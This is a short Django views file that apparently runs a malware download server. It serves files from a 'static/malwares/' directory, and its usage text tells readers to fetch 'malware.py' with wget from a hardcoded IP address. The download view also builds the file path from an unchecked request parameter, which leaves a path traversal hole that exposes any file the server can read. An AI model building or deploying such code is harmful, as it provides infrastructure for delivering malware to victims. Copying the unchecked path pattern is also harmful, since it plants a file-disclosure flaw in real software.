from django.shortcuts import render
from django.http import FileResponse, HttpResponse
import requests
import os, sys, time, logging
from Project_Z.settings import DEBUG
# ======================================

USAGE = '''
       Usage:
            wget http://104.153.98.175/download?f=malware.py

'''
def index(request): 
    
    global USAGE

    context = {'usage': USAGE} if request.GET.get('u') else {}
    return render(request, 'index.html', context)

def download(request):

    global DEBUG

    file = request.GET.get('f')
    print("[DOWNLOAD] From {0}: File: {1}".format(request.META['REMOTE_ADDR'], file))
    f = open('static/malwares/'+file, 'r')
    response = HttpResponse(f)
    if DEBUG: print("[DEBUG] File Writen to FileResponse")
    response['Content-Type']        = 'application/octet-stream'
    response['Content-Disposition'] = 'attachment;filename="{0}"'.format(file)
    f.close() # Exception
    return response
